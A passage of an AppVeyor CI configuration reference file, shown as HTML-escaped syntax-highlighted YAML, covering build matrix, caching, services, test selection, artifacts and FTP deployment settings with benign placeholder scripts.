&lt;/span>&lt;span class="w"> &lt;/span>- &lt;span class="nt">platform&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="l">x64&lt;/span>&lt;span class="w">
&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="nt">configuration&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="l">Release&lt;/span>&lt;span class="w">
&lt;/span>&lt;span class="w">
&lt;/span>&lt;span class="w">&lt;/span>&lt;span class="c"># exclude configuration from the matrix. Works similarly to &amp;#39;allow_failures&amp;#39; but build not even being started for excluded combination.&lt;/span>&lt;span class="w">
&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="nt">exclude&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="w">
&lt;/span>&lt;span class="w"> &lt;/span>- &lt;span class="nt">platform&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="l">x86&lt;/span>&lt;span class="w">
&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="nt">configuration&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="l">Debug&lt;/span>&lt;span class="w">
&lt;/span>&lt;span class="w">
&lt;/span>&lt;span class="w">&lt;/span>&lt;span class="c"># build cache to preserve files/folders between builds&lt;/span>&lt;span class="w">
&lt;/span>&lt;span class="w">&lt;/span>&lt;span class="nt">cache&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="w">
&lt;/span>&lt;span class="w"> &lt;/span>- &lt;span class="l">packages -&amp;gt; **\packages.config &lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="c"># preserve &amp;#34;packages&amp;#34; directory in the root of build folder but will reset it if packages.config is modified&lt;/span>&lt;span class="w">
&lt;/span>&lt;span class="w"> &lt;/span>- &lt;span class="l">projectA\libs&lt;/span>&lt;span class="w">
&lt;/span>&lt;span class="w"> &lt;/span>- &lt;span class="l">node_modules &lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="c"># local npm modules&lt;/span>&lt;span class="w">
&lt;/span>&lt;span class="w"> &lt;/span>- &lt;span class="s1">&amp;#39;%LocalAppData%\NuGet\Cache&amp;#39;&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="c"># NuGet &amp;lt; v3&lt;/span>&lt;span class="w">
&lt;/span>&lt;span class="w"> &lt;/span>- &lt;span class="s1">&amp;#39;%LocalAppData%\NuGet\v3-cache&amp;#39;&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="c"># NuGet v3&lt;/span>&lt;span class="w">
&lt;/span>&lt;span class="w">
&lt;/span>&lt;span class="w">&lt;/span>&lt;span class="c"># enable service required for build/tests&lt;/span>&lt;span class="w">
&lt;/span>&lt;span class="w">&lt;/span>&lt;span class="nt">services&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="w">
&lt;/span>&lt;span class="w"> &lt;/span>- &lt;span class="l">mssql2014 &lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="c"># start SQL Server 2014 Express&lt;/span>&lt;span class="w">
&lt;/span>&lt;span class="w"> &lt;/span>- &lt;span class="l">mssql2014rs &lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="c"># start SQL Server 2014 Express and Reporting Services&lt;/span>&lt;span class="w">
&lt;/span>&lt;span class="w"> &lt;/span>- &lt;span class="l">mssql2012sp1 &lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="c"># start SQL Server 2012 SP1 Express&lt;/span>&lt;span class="w">
&lt;/span>&lt;span class="w"> &lt;/span>- &lt;span class="l">mssql2012sp1rs &lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="c"># start SQL Server 2012 SP1 Express and Reporting Services&lt;/span>&lt;span class="w">
&lt;/span>&lt;span class="w"> &lt;/span>- &lt;span class="l">mssql2008r2sp2 &lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="c"># start SQL Server 2008 R2 SP2 Express&lt;/span>&lt;span class="w">
&lt;/span>&lt;span class="w"> &lt;/span>- &lt;span class="l">mssql2008r2sp2rs &lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="c"># start SQL Server 2008 R2 SP2 Express and Reporting Services&lt;/span>&lt;span class="w">
&lt;/span>&lt;span class="w"> &lt;/span>- &lt;span class="l">mysql &lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="c"># start MySQL 5.6 service&lt;/span>&lt;span class="w">
&lt;/span>&lt;span class="w"> &lt;/span>- &lt;span class="l">postgresql &lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="c"># start PostgreSQL 9.5 service&lt;/span>&lt;span class="w">
&lt;/span>&lt;span class="w"> &lt;/span>- &lt;span class="l">iis &lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="c"># start IIS&lt;/span>&lt;span class="w">
&lt;/span>&lt;span class="w"> &lt;/span>- &lt;span class="l">msmq &lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="c"># start Queuing services&lt;/span>&lt;span class="w">
&lt;/span>&lt;span class="w"> &lt;/span>- &lt;span class="l">mongodb &lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="c"># start MongoDB&lt;/span>&lt;span class="w">
&lt;/span>&lt;span class="w">
&lt;/span>&lt;span class="w">&lt;/span>&lt;span class="c"># scripts that run after cloning repository&lt;/span>&lt;span class="w">
&lt;/span>&lt;span class="w">&lt;/span>&lt;span class="nt">install&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="w">
&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="c"># by default, all script lines are interpreted as batch&lt;/span>&lt;span class="w">
&lt;/span>&lt;span class="w"> &lt;/span>- &lt;span class="l">echo This is batch&lt;/span>&lt;span class="w">
&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="c"># to run script as a PowerShell command prepend it with ps:&lt;/span>&lt;span class="w">
&lt;/span>&lt;span class="w"> &lt;/span>- &lt;span class="nt">ps&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="l">Write-Host &amp;#39;This is PowerShell&amp;#39;&lt;/span>&lt;span class="w">
&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="c"># batch commands start from cmd:&lt;/span>&lt;span class="w">
&lt;/span>&lt;span class="w"> &lt;/span>- &lt;span class="nt">cmd&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="l">echo This is batch again&lt;/span>&lt;span class="w">
&lt;/span>&lt;span class="w"> &lt;/span>- &lt;span class="nt">cmd&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="l">set MY_VAR=12345&lt;/span>&lt;span class="w">
&lt;/span>&lt;span class="w">
&lt;/span>&lt;span class="w">&lt;/span>&lt;span class="c"># enable patching of AssemblyInfo.* files&lt;/span>&lt;span class="w">
&lt;/span>&lt;span class="w">&lt;/span>&lt;span class="nt">assembly_info&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="w">
&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="nt">patch&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="kc">true&lt;/span>&lt;span class="w">
&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="nt">file&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="l">AssemblyInfo.*&lt;/span>&lt;span class="w">
&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="nt">assembly_version&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="s2">&amp;#34;2.2.{build}&amp;#34;&lt;/span>&lt;span class="w">
&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="nt">assembly_file_version&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="s2">&amp;#34;{version}&amp;#34;&lt;/span>&lt;span class="w">
&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="nt">assembly_informational_version&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="s2">&amp;#34;{version}&amp;#34;&lt;/span>&lt;span class="w">
&lt;/span>&lt;span class="w">
&lt;/span>&lt;span class="w">
&lt;/span>&lt;span class="w">&lt;/span>&lt;span class="c"># Automatically register private account and/or project AppVeyor NuGet feeds.&lt;/span>&lt;span class="w">
&lt;/span>&lt;span class="w">&lt;/span>&lt;span class="nt">nuget&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="w">
&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="nt">account_feed&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="kc">true&lt;/span>&lt;span class="w">
&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="nt">project_feed&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="kc">true&lt;/span>&lt;span class="w">
&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="nt">disable_publish_on_pr&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="kc">true&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="c"># disable publishing of .nupkg artifacts to account/project feeds for pull request builds&lt;/span>&lt;span class="w">
&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="nt">publish_wap_octopus&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="kc">true&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="c"># disable publishing of Octopus Deploy .nupkg artifacts to account/project feeds&lt;/span>&lt;span class="w">
&lt;/span>&lt;span class="w">
&lt;/span>&lt;span class="w">&lt;/span>&lt;span class="c">#---------------------------------#&lt;/span>&lt;span class="w">
&lt;/span>&lt;span class="w">&lt;/span>&lt;span class="c"># build configuration #&lt;/span>&lt;span class="w">
&lt;/span>&lt;span class="w">&lt;/span>&lt;span class="c">#---------------------------------#&lt;/span>&lt;span class="w">
&lt;/span>&lt;span class="w">
&lt;/span>&lt;span class="w">&lt;/span>&lt;span class="c"># build platform, i.e. x86, x64, Any CPU. This setting is optional.&lt;/span>&lt;span class="w">
&lt;/span>&lt;span class="w">&lt;/span>&lt;span class="nt">platform&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="l">Any CPU&lt;/span>&lt;span class="w">
&lt;/span>&lt;span class="w">
&lt;/span>&lt;span class="w">&lt;/span>&lt;span class="c"># to add several platforms to build matrix:&lt;/span>&lt;span class="w">
&lt;/span>&lt;span class="w">&lt;/span>&lt;span class="c">#platform:&lt;/span>&lt;span class="w">
&lt;/span>&lt;span class="w">&lt;/span>&lt;span class="c"># - x86&lt;/span>&lt;span class="w">
&lt;/span>&lt;span class="w">&lt;/span>&lt;span class="c"># - Any CPU&lt;/span>&lt;span class="w">
&lt;/span>&lt;span class="w">
&lt;/span>&lt;span class="w">&lt;/span>&lt;span class="c"># build Configuration, i.e. Debug, Release, etc.&lt;/span>&lt;span class="w">
&lt;/span>&lt;span class="w">&lt;/span>&lt;span class="nt">configuration&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="l">Release&lt;/span>&lt;span class="w">
&lt;/span>&lt;span class="w">
&lt;/span>&lt;span class="w">&lt;/span>&lt;span class="c"># to add several configurations to build matrix:&lt;/span>&lt;span class="w">
&lt;/span>&lt;span class="w">&lt;/span>&lt;span class="c">#configuration:&lt;/span>&lt;span class="w">
&lt;/span>&lt;span class="w">&lt;/span>&lt;span class="c"># - Debug&lt;/span>&lt;span class="w">
&lt;/span>&lt;span class="w">&lt;/span>&lt;span class="c"># - Release&lt;/span>&lt;span class="w">
&lt;/span>&lt;span class="w">
&lt;/span>&lt;span class="w">&lt;/span>&lt;span class="c"># Build settings, not to be confused with &amp;#34;before_build&amp;#34; and &amp;#34;after_build&amp;#34;.&lt;/span>&lt;span class="w">
&lt;/span>&lt;span class="w">&lt;/span>&lt;span class="c"># &amp;#34;project&amp;#34; is relative to the original build directory and not influenced by directory changes in &amp;#34;before_build&amp;#34;.&lt;/span>&lt;span class="w">
&lt;/span>&lt;span class="w">&lt;/span>&lt;span class="nt">build&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="w">
&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="nt">parallel&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="kc">true&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="c"># enable MSBuild parallel builds&lt;/span>&lt;span class="w">
&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="nt">project&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="l">MyTestAzureCS.sln &lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="c"># path to Visual Studio solution or project&lt;/span>&lt;span class="w">
&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="nt">publish_wap&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="kc">true&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="c"># package Web Application Projects (WAP) for Web Deploy&lt;/span>&lt;span class="w">
&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="nt">publish_wap_xcopy&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="kc">true&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="c"># package Web Application Projects (WAP) for XCopy deployment&lt;/span>&lt;span class="w">
&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="nt">publish_wap_beanstalk&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="kc">true&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="c"># Package Web Applications for AWS Elastic Beanstalk deployment&lt;/span>&lt;span class="w">
&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="nt">publish_wap_octopus&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="kc">true&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="c"># Package Web Applications for Octopus deployment&lt;/span>&lt;span class="w">
&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="nt">publish_azure_webjob&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="kc">true&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="c"># Package Azure WebJobs for Zip Push deployment&lt;/span>&lt;span class="w">
&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="nt">publish_azure&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="kc">true&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="c"># package Azure Cloud Service projects and push to artifacts&lt;/span>&lt;span class="w">
&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="nt">publish_aspnet_core&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="kc">true&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="c"># Package ASP.NET Core projects&lt;/span>&lt;span class="w">
&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="nt">publish_core_console&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="kc">true&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="c"># Package .NET Core console projects&lt;/span>&lt;span class="w">
&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="nt">publish_nuget&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="kc">true&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="c"># package projects with .nuspec files and push to artifacts&lt;/span>&lt;span class="w">
&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="nt">publish_nuget_symbols&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="kc">true&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="c"># generate and publish NuGet symbol packages&lt;/span>&lt;span class="w">
&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="nt">include_nuget_references&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="kc">true&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="c"># add -IncludeReferencedProjects option while packaging NuGet artifacts&lt;/span>&lt;span class="w">
&lt;/span>&lt;span class="w">
&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="c"># MSBuild verbosity level&lt;/span>&lt;span class="w">
&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="nt">verbosity&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="l">quiet|minimal|normal|detailed&lt;/span>&lt;span class="w">
&lt;/span>&lt;span class="w">
&lt;/span>&lt;span class="w">
&lt;/span>&lt;span class="w">&lt;/span>&lt;span class="c"># scripts to run before build&lt;/span>&lt;span class="w">
&lt;/span>&lt;span class="w">&lt;/span>&lt;span class="nt">before_build&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="w">
&lt;/span>&lt;span class="w">
&lt;/span>&lt;span class="w">&lt;/span>&lt;span class="c"># to run your custom scripts instead of automatic MSBuild&lt;/span>&lt;span class="w">
&lt;/span>&lt;span class="w">&lt;/span>&lt;span class="nt">build_script&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="w">
&lt;/span>&lt;span class="w">
&lt;/span>&lt;span class="w">&lt;/span>&lt;span class="c"># scripts to run after build (working directory and environment changes are persisted from the previous steps)&lt;/span>&lt;span class="w">
&lt;/span>&lt;span class="w">&lt;/span>&lt;span class="nt">after_build&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="w">
&lt;/span>&lt;span class="w">
&lt;/span>&lt;span class="w">&lt;/span>&lt;span class="c"># scripts to run *after* solution is built and *before* automatic packaging occurs (web apps, NuGet packages, Azure Cloud Services)&lt;/span>&lt;span class="w">
&lt;/span>&lt;span class="w">&lt;/span>&lt;span class="nt">before_package&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="w">
&lt;/span>&lt;span class="w">
&lt;/span>&lt;span class="w">&lt;/span>&lt;span class="c"># to disable automatic builds&lt;/span>&lt;span class="w">
&lt;/span>&lt;span class="w">&lt;/span>&lt;span class="c">#build: off&lt;/span>&lt;span class="w">
&lt;/span>&lt;span class="w">
&lt;/span>&lt;span class="w">&lt;/span>&lt;span class="c">#---------------------------------#&lt;/span>&lt;span class="w">
&lt;/span>&lt;span class="w">&lt;/span>&lt;span class="c"># tests configuration #&lt;/span>&lt;span class="w">
&lt;/span>&lt;span class="w">&lt;/span>&lt;span class="c">#---------------------------------#&lt;/span>&lt;span class="w">
&lt;/span>&lt;span class="w">
&lt;/span>&lt;span class="w">&lt;/span>&lt;span class="c"># to run tests against only selected assemblies and/or categories&lt;/span>&lt;span class="w">
&lt;/span>&lt;span class="w">&lt;/span>&lt;span class="nt">test&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="w">
&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="nt">assemblies&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="w">
&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="nt">only&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="w">
&lt;/span>&lt;span class="w"> &lt;/span>- &lt;span class="l">asm1.dll&lt;/span>&lt;span class="w">
&lt;/span>&lt;span class="w"> &lt;/span>- &lt;span class="l">asm2.dll&lt;/span>&lt;span class="w">
&lt;/span>&lt;span class="w">
&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="nt">categories&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="w">
&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="nt">only&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="w">
&lt;/span>&lt;span class="w"> &lt;/span>- &lt;span class="l">UI&lt;/span>&lt;span class="w">
&lt;/span>&lt;span class="w"> &lt;/span>- &lt;span class="l">E2E&lt;/span>&lt;span class="w">
&lt;/span>&lt;span class="w">
&lt;/span>&lt;span class="w">&lt;/span>&lt;span class="c"># to run tests against all except selected assemblies and/or categories&lt;/span>&lt;span class="w">
&lt;/span>&lt;span class="w">&lt;/span>&lt;span class="c">#test:&lt;/span>&lt;span class="w">
&lt;/span>&lt;span class="w">&lt;/span>&lt;span class="c"># assemblies:&lt;/span>&lt;span class="w">
&lt;/span>&lt;span class="w">&lt;/span>&lt;span class="c"># except:&lt;/span>&lt;span class="w">
&lt;/span>&lt;span class="w">&lt;/span>&lt;span class="c"># - asm1.dll&lt;/span>&lt;span class="w">
&lt;/span>&lt;span class="w">&lt;/span>&lt;span class="c"># - asm2.dll&lt;/span>&lt;span class="w">
&lt;/span>&lt;span class="w">&lt;/span>&lt;span class="c">#&lt;/span>&lt;span class="w">
&lt;/span>&lt;span class="w">&lt;/span>&lt;span class="c"># categories:&lt;/span>&lt;span class="w">
&lt;/span>&lt;span class="w">&lt;/span>&lt;span class="c"># except:&lt;/span>&lt;span class="w">
&lt;/span>&lt;span class="w">&lt;/span>&lt;span class="c"># - UI&lt;/span>&lt;span class="w">
&lt;/span>&lt;span class="w">&lt;/span>&lt;span class="c"># - E2E&lt;/span>&lt;span class="w">
&lt;/span>&lt;span class="w">
&lt;/span>&lt;span class="w">&lt;/span>&lt;span class="c"># to run tests from different categories as separate jobs in parallel&lt;/span>&lt;span class="w">
&lt;/span>&lt;span class="w">&lt;/span>&lt;span class="c">#test:&lt;/span>&lt;span class="w">
&lt;/span>&lt;span class="w">&lt;/span>&lt;span class="c"># categories:&lt;/span>&lt;span class="w">
&lt;/span>&lt;span class="w">&lt;/span>&lt;span class="c"># - A # A category common for all jobs&lt;/span>&lt;span class="w">
&lt;/span>&lt;span class="w">&lt;/span>&lt;span class="c"># - [UI] # 1st job&lt;/span>&lt;span class="w">
&lt;/span>&lt;span class="w">&lt;/span>&lt;span class="c"># - [DAL, BL] # 2nd job&lt;/span>&lt;span class="w">
&lt;/span>&lt;span class="w">
&lt;/span>&lt;span class="w">&lt;/span>&lt;span class="c"># scripts to run before tests (working directory and environment changes are persisted from the previous steps such as &amp;#34;before_build&amp;#34;)&lt;/span>&lt;span class="w">
&lt;/span>&lt;span class="w">&lt;/span>&lt;span class="nt">before_test&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="w">
&lt;/span>&lt;span class="w"> &lt;/span>- &lt;span class="l">echo script1&lt;/span>&lt;span class="w">
&lt;/span>&lt;span class="w"> &lt;/span>- &lt;span class="nt">ps&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="l">Write-Host &amp;#34;script1&amp;#34;&lt;/span>&lt;span class="w">
&lt;/span>&lt;span class="w">
&lt;/span>&lt;span class="w">&lt;/span>&lt;span class="c"># to run your custom scripts instead of automatic tests&lt;/span>&lt;span class="w">
&lt;/span>&lt;span class="w">&lt;/span>&lt;span class="nt">test_script&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="w">
&lt;/span>&lt;span class="w"> &lt;/span>- &lt;span class="l">echo This is my custom test script&lt;/span>&lt;span class="w">
&lt;/span>&lt;span class="w">
&lt;/span>&lt;span class="w">&lt;/span>&lt;span class="c"># scripts to run after tests&lt;/span>&lt;span class="w">
&lt;/span>&lt;span class="w">&lt;/span>&lt;span class="nt">after_test&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="w">
&lt;/span>&lt;span class="w">
&lt;/span>&lt;span class="w">&lt;/span>&lt;span class="c"># to disable automatic tests&lt;/span>&lt;span class="w">
&lt;/span>&lt;span class="w">&lt;/span>&lt;span class="c">#test: off&lt;/span>&lt;span class="w">
&lt;/span>&lt;span class="w">
&lt;/span>&lt;span class="w">
&lt;/span>&lt;span class="w">&lt;/span>&lt;span class="c">#---------------------------------#&lt;/span>&lt;span class="w">
&lt;/span>&lt;span class="w">&lt;/span>&lt;span class="c"># artifacts configuration #&lt;/span>&lt;span class="w">
&lt;/span>&lt;span class="w">&lt;/span>&lt;span class="c">#---------------------------------#&lt;/span>&lt;span class="w">
&lt;/span>&lt;span class="w">
&lt;/span>&lt;span class="w">&lt;/span>&lt;span class="nt">artifacts&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="w">
&lt;/span>&lt;span class="w">
&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="c"># pushing a single file&lt;/span>&lt;span class="w">
&lt;/span>&lt;span class="w"> &lt;/span>- &lt;span class="nt">path&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="l">test.zip&lt;/span>&lt;span class="w">
&lt;/span>&lt;span class="w">
&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="c"># pushing a single file with environment variable in path and &amp;#34;Deployment name&amp;#34; specified&lt;/span>&lt;span class="w">
&lt;/span>&lt;span class="w"> &lt;/span>- &lt;span class="nt">path&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="l">MyProject\bin\$(configuration)&lt;/span>&lt;span class="w">
&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="nt">name&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="l">myapp&lt;/span>&lt;span class="w">
&lt;/span>&lt;span class="w">
&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="c"># pushing entire folder as a zip archive&lt;/span>&lt;span class="w">
&lt;/span>&lt;span class="w"> &lt;/span>- &lt;span class="nt">path&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="l">logs&lt;/span>&lt;span class="w">
&lt;/span>&lt;span class="w">
&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="c"># pushing all *.nupkg files in build directory recursively&lt;/span>&lt;span class="w">
&lt;/span>&lt;span class="w"> &lt;/span>- &lt;span class="nt">path&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="s1">&amp;#39;**\*.nupkg&amp;#39;&lt;/span>&lt;span class="w">
&lt;/span>&lt;span class="w">
&lt;/span>&lt;span class="w">
&lt;/span>&lt;span class="w">&lt;/span>&lt;span class="c">#---------------------------------#&lt;/span>&lt;span class="w">
&lt;/span>&lt;span class="w">&lt;/span>&lt;span class="c"># deployment configuration #&lt;/span>&lt;span class="w">
&lt;/span>&lt;span class="w">&lt;/span>&lt;span class="c">#---------------------------------#&lt;/span>&lt;span class="w">
&lt;/span>&lt;span class="w">
&lt;/span>&lt;span class="w">&lt;/span>&lt;span class="c"># providers: Local, FTP, WebDeploy, AzureCS, AzureBlob, S3, NuGet, Environment&lt;/span>&lt;span class="w">
&lt;/span>&lt;span class="w">&lt;/span>&lt;span class="c"># provider names are case-sensitive!&lt;/span>&lt;span class="w">
&lt;/span>&lt;span class="w">&lt;/span>&lt;span class="nt">deploy&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="w">
&lt;/span>&lt;span class="w">
&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="c"># FTP deployment provider settings&lt;/span>&lt;span class="w">
&lt;/span>&lt;span class="w"> &lt;/span>- &lt;span class="nt">provider&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="l">FTP&lt;/span>&lt;span class="w">
&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="nt">protocol&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="l">ftp|ftps|sftp&lt;/span>&lt;span class="w">
&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="nt">host&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="l">ftp.myserver.com&lt;/span>&lt;span class="w">
&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="nt">username&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="l">admin&lt;/span>&lt;span class="w">
&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="nt">password&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="w">
&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="nt">secure&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="l">eYKZKFkkEvFYWX6NfjZIVw==&lt;/span>&lt;span class="w">
&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="nt">folder&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="w">
&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="nt">application&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="w">
&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="nt">active_mode&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="kc">false&lt;/span>&lt;span class="w">
&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="nt">beta&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="kc">true&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="c"># enable alternative FTP library for &amp;#39;ftp&amp;#39; and &amp;#39;ftps&amp;#39; modes&lt;/span>&lt;span class="w">
&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="nt">debug&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="kc">true&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="c"># show complete FTP log&lt;/span>&lt;span class="w">
&lt;/span>&lt;span class="w">
